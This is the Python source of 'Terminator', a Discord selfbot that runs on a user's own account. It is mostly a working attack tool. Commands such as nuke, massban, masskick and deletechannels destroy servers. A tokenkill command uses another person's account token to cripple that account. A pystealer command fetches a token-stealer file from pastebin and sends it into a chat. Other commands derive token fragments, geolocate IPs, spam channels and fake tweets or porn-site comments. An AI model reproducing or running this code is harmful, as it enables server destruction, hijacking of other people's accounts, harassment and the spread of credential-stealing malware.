#Terminator Selfbot | zeynoxapps.xyz
#---------------------------------
#if you get errors try run it on replit.com

import discord, json
from colorama import Fore, init
from discord.ext import commands
import datetime
import requests
import asyncio
import time
from itertools import cycle
import random
import aiohttp
import io
import hashlib
import sys
import speedtest as st
import pandas as pd
from datetime import datetime
from dhooks import Webhook
import base64

init()

start_time = datetime.utcnow()

def get_new_speeds():
    speed_test = st.Speedtest()
    speed_test.get_best_server()

    # Get ping (miliseconds)
    ping = speed_test.results.ping

    return (ping)

new_speeds = get_new_speeds()


if new_speeds>200:
  print(Fore.RED+"[-] ERROR | YOU CANT RUN THE SELFBOT WITH OVER 200 PING - "+str(new_speeds))
  time.sleep(8)
  exit()

with open('config.json') as tokf:
  config = json.load(tokf)

token = config.get('token')

embedimage = config.get('embedimage')

embedcolor = int(config.get('embedcolor'))

emoji = config.get('embedemoji')

if token == "":
  print("In order to run Terminator Selfbot please add your token in config.json file!")
  time.sleep(20)
  exit()


prefix = config.get('prefix')

safemode = config.get('noembeds')

headerss = {
    'Authorization': token,
    'Content-Type': 'application/json'
}
resa = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headerss)

terminator = commands.Bot(description="Terminator",command_prefix=prefix,self_bot=True)

titleembed = config.get('embedtitle')

bitly_key = config.get('bitly_key')

config12 = json.loads(resa.text)

ptype = config12.get('premium_type')


if ptype == 0:
  nitron = "No nitro"
elif ptype == 1:
  nitron = "Nitro Classic"
elif ptype == 2:
  nitron = "Nitro Boost"

print(f'''{Fore.CYAN}

                           ╔╦╗╔═╗╦═╗╔╦╗╦╔╗╔╔═╗╔╦╗╔═╗╦═╗
                            ║ ║╣ ╠╦╝║║║║║║║╠═╣ ║ ║ ║╠╦╝
                            ╩ ╚═╝╩╚═╩ ╩╩╝╚╝╩ ╩ ╩ ╚═╝╩╚═
         ═══════════════════════════════════════════════════════════════          
                            Logged in as {config12.get('username')}#{config12.get('discriminator')}  
                            Nitro type - {nitron}      
                            Internet latency - {new_speeds}ms                                              
                            Terminator prefix - {prefix}                                           
                            Terminator Version - 1.3                                              
        ═════════════════════════════════════════════════════════════════
    ''' + Fore.RESET)

print(Fore.BLUE+"[INFO] You can download updates and get support from zeynoxapps.xyz\n")
if safemode == 'True':
  print(Fore.RED+"[WARNING] SAFE MODE IS ENABLED (NO EMBEDS), SOME COMMANDS MAY NOT BE AVAILABLE!")

terminator.remove_command('help')

@terminator.command() 
async def help(ctx):
  print(Fore.GREEN+"[INFO] Used help Command.")
  if safemode == 'True':
    await ctx.message.delete()
    await ctx.send("""```Terminator Selfbot
    
    ping - See if the bot is online (to see more disable safemode)
    output [text] - output text to the console
    nuke - nukes a server 
    alladmin - makes everyone admin
    massban - mass ban everyone in the server
    massbotban [bot prefix]- mass ban everyone in the server with a bot
    masskick - mass kick everyone in the server
    info - gets information about the server
    gettoken [id] - gets the token start from the id
    serverpfp - gets the guild pfp
    tokeninfo [token] - gets information about a token
    tokenkill [token] - crashes a token
    deletechannels - deletes all channels
    cloneserver - clones a server
    purge - purge a channel
    infiniterepeat [text] - infinite repeats a text
    adminservers - shows the servers you're admin in
    pystealer - sends a python token stealer file
    hacker [text] - 1337 speak
    delhook [webhook] - deletes a webhook
    md5 [text] - md5 encrypt a message
    dm [user] [message] - dm's a user
    bitly [url] - shorts an url with bitly
    tweet [username] [text] - generates a fake tweet
    pornhub [username] [text] - generates a fake pornhub comment
    avatar [user ping] - gets user's avatar
    massreact [emoji] - massreacts with the emoji
    embed [text] - sends an embed message
    firstmessage - shows the first message in the channel
    locateip [ip] - locates an ip
    reverse [text] - writes your text reverse
    clear - clears the chat with empty messages
    game [text] - custom game activity
    competing [text] - custom competing activity
    watching [text] - custom watching activity
    stopactivity - stops your activity
    beg [how many times] - dank memer pls beg spammer (once 50 seconds)
    credits - shows the author of the selfbot
    shutdown - shutdowns the bot
    
*NOTE - SOME FEATURES MAY BE DISABLED AS YOU ARE IN SAFE MODE (no embeds)```""")
  elif safemode == 'False':
    await ctx.message.delete()
    embedVar = discord.Embed(title=titleembed, description="Help command", color=embedcolor	)
    embedVar.set_image(url=embedimage)
    embedVar.add_field(name=emoji+" "+prefix+"hack ", value =  "shows hacking & nuke commands",  inline=False)
    embedVar.add_field(name=emoji+" "+prefix+"text", value = "shows text commands",  inline=False)
    embedVar.add_field(name=emoji+" "+prefix+"images", value = "shows images commands",  inline=False)
    embedVar.add_field(name=emoji+" "+prefix+"other", value = "shows other commands",  inline=False)
    embedVar.add_field(name=emoji+" "+prefix+"credits", value = "shows the author of the selfbot",  inline=False)
    embedVar.add_field(name="NOTE", value = " DISCORD SELFBOTS ARE NO MORE ALLOWED SO USE IT AT YOUR OWN RISK",  inline=False)
    embedVar.add_field(name=":crown:", value = " ___Terminator is the best___",  inline=True)
    await ctx.send(embed=embedVar)

  
@terminator.command()
async def hack(ctx):
    print(Fore.GREEN+"[INFO] Used hack Command.")
    if safemode == 'False':
      await ctx.message.delete()
      embedVar = discord.Embed(title=titleembed, description="Hacking & nuke commands", color=embedcolor	)
      embedVar.set_image(url=embedimage)
      embedVar.add_field(name=emoji+" "+prefix+"nuke ", value = " nukes a server",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"alladmin ", value = " makes everyone admin",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"massban ", value = " mass ban everyone in the server",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"massbotban [bot prefix]", value = " mass ban everyone in the server with a bot",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"masskick ", value = " masskick everyone in the server",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"info ", value = " gets information about the server",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"gettoken [id]", value = " gets the token start from the id",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"serverpfp ", value = " gets the guild pfp",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"tokeninfo [token]", value = " gets information about a token",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"tokenkill [token]", value = " crashes a token",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"deletechannels", value = " deletes all channels",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"cloneserver ", value = " clones a server",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"purge ", value = " purge a channel",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"delhook [webhook]", value = " deletes a webhook",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"adminservers ", value = " shows the server you're admin in",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"pystealer ", value = " sends a python token stealer file",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"locateip [ip] ", value = " locates a ip",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"clear ", value = " clears the chat with empty messages",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"shutdown  ", value = " shutdowns the bot",  inline=False)
      embedVar.add_field(name=":crown:", value = " ___Terminator is the best___",  inline=True)
      await ctx.send(embed=embedVar)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")

@terminator.command()
async def images(ctx):
    print(Fore.GREEN+"[INFO] Used images Command.")
    if safemode == 'False':
      await ctx.message.delete()
      embedVar = discord.Embed(title=titleembed, description="Text commands", color=embedcolor	)
      embedVar.set_image(url=embedimage)
      embedVar.add_field(name=emoji+" "+prefix+"tweet [username] [text] ", value = " generates a fake tweet",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"pornhub [username] [text] ", value = " generates a fake pornhub comment",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"avatar [user ping]", value = " gets user's avatar",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"shutdown  ", value = " shutdowns the bot",  inline=False)
      embedVar.add_field(name=":crown:", value = " ___Terminator is the best___",  inline=True)
      await ctx.send(embed=embedVar)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")

@terminator.command()
async def other(ctx):
    print(Fore.GREEN+"[INFO] Used images Command.")
    if safemode == 'False':
      await ctx.message.delete()
      embedVar = discord.Embed(title=titleembed, description="Text commands", color=embedcolor	)
      embedVar.set_image(url=embedimage)
      embedVar.add_field(name=emoji+" "+prefix+"game [text]", value = " custom game activity",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"competing [text]", value = " custom competing activity",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"watching [text]", value = " custom watching activity",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"stopactivity", value = " stops your activity",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"shutdown  ", value = " shutdowns the bot",  inline=False)
      embedVar.add_field(name=":crown:", value = " ___Terminator is the best___",  inline=True)
      await ctx.send(embed=embedVar)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")


@terminator.command()
async def text(ctx):
    print(Fore.GREEN+"[INFO] Used text Command.")
    if safemode == 'False':
      await ctx.message.delete()
      embedVar = discord.Embed(title=titleembed, description="Text commands", color=embedcolor	)
      embedVar.set_image(url=embedimage)
      embedVar.add_field(name=emoji+" "+prefix+"ping ", value =  "shows current latency",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"output [text]", value = "output the text to the console",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"info ", value = " gets information about the server",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"serverpfp ", value = " gets the guild pfp",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"infiniterepeat [text] ", value = " infinite repeats a text",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"pystealer ", value = " sends a python token stealer file",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"hacker [text] ", value = " 1337 speak",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"md5 [text] ", value = " md5 encrypt a message",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"bitly [url] ", value = " horts a url with bitly",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"dm [user] [message]", value = " dm's a message",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"tweet [username] [text] ", value = " generates a fake tweet",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"pornhub [username] [text] ", value = " generates a fake pornhub comment",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"massreact [emoji]  ", value = " massreacts with the emoji",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"embed [text]  ", value = " sends a embed message",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"firstmessage  ", value = " shows the first message in the channel",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"reverse [text] ", value = " writes your text reversed",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"clear ", value = " clears the chat with empty messages",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"beg [how many times]  ", value = " dank memer pls beg spammer (once 50 seconds)",  inline=False)
      embedVar.add_field(name=emoji+" "+prefix+"shutdown  ", value = " shutdowns the bot",  inline=False)
      embedVar.add_field(name=":crown:", value = " ___Terminator is the best___",  inline=True)
      await ctx.send(embed=embedVar)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")

@terminator.command() 
async def ping(ctx):
  print(Fore.GREEN+"[INFO] Used ping Command.")
  if safemode == 'True':
    await ctx.message.delete()
    await ctx.send("Terminator is `UP!`. In order to get more information, please set `NOEMBEDS` to `FALSE`!")
  elif safemode == 'False':
    await ctx.message.delete()
    embedVar = discord.Embed(title="Terminator Ping Command", description="Your latency", color=0x00ff00)
    embedVar.add_field(name="Latency: ", value=f'Current latency {round(terminator.latency * 1000)}ms', inline=False)
    await ctx.send(embed=embedVar)

@terminator.command()
async def output(ctx,*,args):
  print(Fore.GREEN+"[OUTPUT COMMAND] "+args)
  await ctx.message.delete()

@terminator.command()
async def nuke(ctx):
    print(Fore.GREEN+"[INFO] Used nuke Command.")
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Nuked by Terminator",
            description="terminator",
            reason="Terminator",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Terminated")
    for _i in range(250):
        await ctx.guild.create_role(name="Terminated")

@terminator.command()
async def massban(ctx):
    print(Fore.GREEN+"[INFO] Used massban Command.")
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.ban(reason="Terminated")
        except:
            pass

@terminator.command()
async def info(ctx):
    print(Fore.GREEN+"[INFO] Used info Command.")
    if safemode=='False':
      await ctx.message.delete()
      date_format = "%a, %d %b %Y %I:%M %p"
      embed = discord.Embed(title=f"{ctx.guild.name}",
                            description=f"{len(ctx.guild.members)} Members\n {len(ctx.guild.roles)} Roles\n {len(ctx.guild.text_channels)} Text-Channels\n {len(ctx.guild.voice_channels)} Voice-Channels\n {len(ctx.guild.categories)} Categories",
                            timestamp=datetime.utcnow(), color=discord.Color.blue())
      embed.add_field(name="Server created at", value=f"{ctx.guild.created_at.strftime(date_format)}")
      embed.add_field(name="Server Owner", value=f"{ctx.guild.owner}")
      embed.add_field(name="Server Region", value=f"{ctx.guild.region}")
      embed.add_field(name="Server ID", value=f"{ctx.guild.id}")
      embed.set_thumbnail(url=f"{ctx.guild.icon_url}")
      await ctx.send(embed=embed)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")

@terminator.command()
async def serverpfp(ctx):
    if safemode=='False':
      await ctx.message.delete()
      em = discord.Embed(title=ctx.guild.name)
      em.set_image(url=ctx.guild.icon_url)
      await ctx.send(embed=em)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")

@terminator.command()
async def tokeninfo(ctx, _token):
    print(Fore.GREEN+"[INFO] Used tokeninfo Command.")
    if safemode=='False':
      await ctx.message.delete()
      headers = {
          'Authorization': _token,
          'Content-Type': 'application/json'
      }
      try:
          res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
          res = res.json()
          user_id = res['id']
          locale = res['locale']
          avatar_id = res['avatar']
          creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
              '%d-%m-%Y %H:%M:%S UTC')
      except KeyError:
          headers = {
              'Authorization': "Bot " + _token,
              'Content-Type': 'application/json'
          }
          try:
              res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
              res = res.json()
              user_id = res['id']
              locale = res['locale']
              avatar_id = res['avatar']
              creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime(
                  '%d-%m-%Y %H:%M:%S UTC')
              em = discord.Embed(
                  description=f"Name: `{res['username']}#{res['discriminator']} ` **BOT**\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
              fields = [
                  {'name': 'Flags', 'value': res['flags']},
                  {'name': 'Verified', 'value': res['verified']},
              ]
              for field in fields:
                  if field['value']:
                      em.add_field(name=field['name'], value=field['value'], inline=False)
                      em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
              return await ctx.send(embed=em)
          except KeyError:
              await ctx.send("Invalid token")
      em = discord.Embed(
          description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`")
      # em.set_footer(text=_token)
      nitro_type = "None"
      if "premium_type" in res:
          if res['premium_type'] == 2:
              nitro_type = "Nitro Premium"
          elif res['premium_type'] == 1:
              nitro_type = "Nitro Classic"
      fields = [
          {'name': 'Phone', 'value': res['phone']},
          {'name': 'Flags', 'value': res['flags']},
          {'name': 'MFA', 'value': res['mfa_enabled']},
          {'name': 'Verified', 'value': res['verified']},
          {'name': 'Nitro', 'value': nitro_type},
      ]
      for field in fields:
          if field['value']:
              em.add_field(name=field['name'], value=field['value'], inline=False)
              em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
      return await ctx.send(embed=em)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")

@terminator.command()
async def cloneserver(ctx): 
    print(Fore.GREEN+"[INFO] Used cloneserver Command.") 
    await ctx.message.delete()
    await terminator.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in terminator.guilds:
        if f'clone-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@terminator.command()
async def tokenkill(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Exeter",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings", headers=headers, json=setting,
                              timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break
              
@terminator.command()
async def masskick(ctx):
    print(Fore.GREEN+"[INFO] Used masskick Command.")
    await ctx.message.delete()
    users = list(ctx.guild.members)
    for user in users:
        try:
            await user.kick(reason="Terminator")
        except:
            pass

@terminator.command()
async def beg(ctx,*,args):
  print(Fore.GREEN+"[INFO] Used beg Command.")
  await ctx.message.delete()
  args=int(args)
  while(args>0):
    await ctx.send("pls beg")
    args=args-1
    await asyncio.sleep(50)

@terminator.command()
async def infiniterepeat(ctx,*,args):
  print(Fore.GREEN+"[INFO] Used infiniterepeat Command.")
  await ctx.message.delete()
  spamsa = True
  while(spamsa==True):
    await ctx.send(str(args))


@terminator.command()
async def purge(ctx, amount: int = None):
    print(Fore.GREEN+"[INFO] Used purge Command.")
    await ctx.message.delete()
    if amount is None:
        async for message in ctx.message.channel.history(limit=999).filter(lambda m: m.author == terminator.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass
    else:
        async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == terminator.user).map(
                lambda m: m):
            try:
                await message.delete()
            except:
                pass

@terminator.command()
async def pystealer(ctx):
  print(Fore.GREEN+"[INFO] Used pystealer Command.")
  await ctx.message.delete()
  import urllib.request

  url = 'https://pastebin.com/raw/iA8ZyiWV'

  urllib.request.urlretrieve(url, 'pystealer.txt')
  await ctx.send(file=discord.File(r'pystealer.txt'))


@terminator.command()
async def adminservers(ctx):
    print(Fore.GREEN+"[INFO] Used adminservers Command.")
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in terminator.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send("**Terminator selfbot**\n"+adminPermServers + botPermServers + banPermServers + kickPermServers)

@terminator.command()
async def shutdown(ctx):
    await ctx.message.delete()
    print(Fore.RED+"Shutdowning..")
    time.sleep(2)
    await ctx.terminator.logout()

@terminator.command()
async def hacker(ctx, *, text):
    print(Fore.GREEN+"[INFO] Used hacker Command.")
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3') \
        .replace('E', '3').replace('i', '!').replace('I', '!') \
        .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'{text}')


@terminator.command()
async def tweet(ctx, username: str = None, *, message: str = None):
    print(Fore.GREEN+"[INFO] Used tweet Command.")
    await ctx.message.delete()
    if username is None or message is None:
        await ctx.send("missing parameters")
        return
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekoterminator.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(str(res['message'])) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"terminator_tweet.png"))
            except:
                await ctx.send(res['message'])

@terminator.command()
async def pornhub(ctx, user: str = None, *, args=None):
    print(Fore.GREEN+"[INFO] Used pornhub Command.")
    await ctx.message.delete()
    if user is None or args is None:
        await ctx.send("missing parameters")
        return
    endpoint = "https://nekoterminator.xyz/api/imagegen?type=phcomment&text=" + args + "&username=" + user + "&image=" + str(
        ctx.author.avatar_url_as(format="png"))
    r = requests.get(endpoint)
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res["message"]) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(file=discord.File(file, f"terminator_pornhub.png"))
    except:
        await ctx.send(res["message"])

@terminator.command()
async def alladmin(ctx):
    print(Fore.GREEN+"[INFO] Used alladmin Command.")
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            if role.permissions.administrator:
                await ctx.author.add_roles(role)
        except:
            pass

@terminator.command()
async def firstmessage(ctx, channel: discord.TextChannel = None):
    print(Fore.GREEN+"[INFO] Used firstmessage Command.")
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump there]({first_message.jump_url})")
    await ctx.send(embed=embed)


@terminator.command()
async def massreact(ctx, emote):
    print(Fore.GREEN+"[INFO] Used massreact Command.")
    await ctx.message.delete()
    messages = await ctx.message.channel.history(limit=20).flatten()
    for message in messages:
        await message.add_reaction(emote)

@terminator.command()
async def embed(ctx,*,message):
      print(Fore.GREEN+"[INFO] Used embed Command.")
      await ctx.message.delete()
      embedVara = discord.Embed(title=message, description="Sended with Terminator", color=0x00ff00)
      await ctx.send(embed=embedVara)

@terminator.command()
async def credits(ctx):
      if safemode == 'False':
        print(Fore.GREEN+"[INFO] Used credits Command.")
        await ctx.message.delete()
        embedVaras = discord.Embed(title="Terminator Self-bot Credits", description="Made by Zeynox @2021", color=0x00ff00)
        await ctx.send(embed=embedVaras)
      else:
        await ctx.message.delete()
        await ctx.send('All made by `Zeynox`.')

@terminator.command()
async def locateip(ctx, *, ipaddr: str = '1.3.3.7'):
    print(Fore.GREEN+"[INFO] Used locateip Command.")
    if safemode == 'False':
      await ctx.message.delete()
      r = requests.get(f'http://extreme-ip-lookup.com/json/{ipaddr}')
      geo = r.json()
      em = discord.Embed()
      fields = [
          {'name': 'IP', 'value': geo['query']},
          {'name': 'Type', 'value': geo['ipType']},
          {'name': 'Country', 'value': geo['country']},
          {'name': 'City', 'value': geo['city']},
          {'name': 'Continent', 'value': geo['continent']},
          {'name': 'Country', 'value': geo['country']},
          {'name': 'Hostname', 'value': geo['ipName']},
          {'name': 'ISP', 'value': geo['isp']},
          {'name': 'Latitute', 'value': geo['lat']},
          {'name': 'Longitude', 'value': geo['lon']},
          {'name': 'Org', 'value': geo['org']},
          {'name': 'Region', 'value': geo['region']},
      ]
      for field in fields:
          if field['value']:
              em.add_field(name=field['name'], value=field['value'], inline=True)
      return await ctx.send(embed=em)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")

@terminator.command()
async def dm(ctx, user: discord.User, *, message=None):
    print(Fore.GREEN+"[INFO] Used dm Command.")
    await user.send(message)

@terminator.command()
async def deletechannels(ctx):
    print(Fore.GREEN+"[INFO] Used deletechannels Command.")
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@terminator.command()
async def reverse(ctx,*, message):
    print(Fore.GREEN+"[INFO] Used reverse Command.")
    await ctx.message.delete()
    message = message[::-1]
    await ctx.send(message)


@terminator.command()
async def md5(ctx,*,message=None):
  print(Fore.GREEN+"[INFO] Used md5 Command.")
  await ctx.message.delete()
  md5 = hashlib.md5(message.encode())
  await ctx.send(md5.hexdigest());

@terminator.command()
async def clear(ctx):
    print(Fore.GREEN+"[INFO] Used clear Command.")
    await ctx.message.delete()
    await ctx.send('ﾠﾠ' + '\n' * 400 + 'ﾠﾠ')



@terminator.command()
async def massbotban(ctx,*,prefixbot):
    print(Fore.GREEN+"[INFO] Used massbotban Command.")
    await ctx.message.delete()
    for member in list(ctx.guild.members):
        message = await ctx.send(str(prefixbot)+"ban " + member.mention)
        await message.delete()
        await asyncio.sleep(1.5)

@terminator.command()
async def mac(ctx, mac): # b'\xfc'
    if safemode == 'False':
      print(Fore.GREEN+"[INFO] Used mac Command.")
      await ctx.message.delete()
      r = requests.get('http://api.macvendors.com/' + mac)
      em = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0xDEADBF)
      em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
      await ctx.send(embed=em)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")


@terminator.command()
async def uptime(ctx): # b'\xfc'
    print(Fore.GREEN+"[INFO] Used uptime Command.")
    await ctx.message.delete()
    uptime = datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'Terminator is up for`'+uptime+'`')

@terminator.command()
async def bitly(ctx, *, link): # b'\xfc'
    print(Fore.GREEN+"[INFO] Used bitly Command.")
    if safemode == 'False':
      await ctx.message.delete()
      if bitly_key == '':
          print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Bitly API key has not been set in the config.json file"+Fore.RESET)
      else:
          try:
              async with aiohttp.ClientSession() as session:
                  async with session.get(f'https://api-ssl.bitly.com/v3/shorten?longUrl={link}&domain=bit.ly&format=json&access_token={bitly_key}') as req:
                      r = await req.read()
                      r = json.loads(r) 
              new = r['data']['url']
              em = discord.Embed()
              em.add_field(name='Shortened link', value=new, inline=False)
              await ctx.send(embed=em)
          except Exception as e:
              print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
          else:
              print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{req.text}"+Fore.RESET)
    else:
      await ctx.message.delete()
      await ctx.send("noembeds must be `False` to run this command!")



@terminator.command()
async def delhook(ctx,*,webhooks):
  print(Fore.GREEN+"[INFO] Used delhook Command.")
  await ctx.message.delete()
  Whook = Webhook(webhooks)
  Whook.delete()
  ctx.send('`Webhook deleted`')


@terminator.command()
async def gettoken(ctx,*,iduu):
  print(Fore.GREEN+"[INFO] Used gettoken Command.")
  if safemode == 'False':
    await ctx.message.delete()
    iduuu = iduu.encode('ascii')
    iduuu = base64.b64encode(iduuu)
    idn = str(iduuu.decode("utf-8"))
    usernnn = await terminator.fetch_user(iduu)
    embedVarasa = discord.Embed(title=emoji+"Username:", description = str(usernnn),color=0x000000)
    embedVarasa.add_field(name=emoji+"Token Start:", value = '`'+idn+'`',  inline=False)
    await ctx.send(embed=embedVarasa)
  else:
    await ctx.message.delete()
    iduu = iduu.encode('ascii')
    iduu = base64.b64encode(iduu)
    await ctx.send(str(iduu.decode("utf-8")))

@terminator.command()
async def avatar(ctx, *,  avamember : discord.Member=None):
    await ctx.message.delete()
    userAvatarUrl = avamember.avatar_url
    await ctx.send(userAvatarUrl)


@terminator.command()
async def competing(ctx,*,value):
  await ctx.message.delete()
  await terminator.change_presence(activity=discord.Activity(type=discord.ActivityType.competing, name=value))


@terminator.command()
async def watching(ctx,*,value):
  await ctx.message.delete()
  await terminator.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=value))


@terminator.command()
async def game(ctx,*,value):
  await ctx.message.delete()
  await terminator.change_presence(activity=discord.Game(name=value))

@terminator.command()
async def stopactivity(ctx):
    await ctx.message.delete()
    await terminator.change_presence(activity=None, status=discord.Status.dnd)

@terminator.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        await ctx.message.delete()
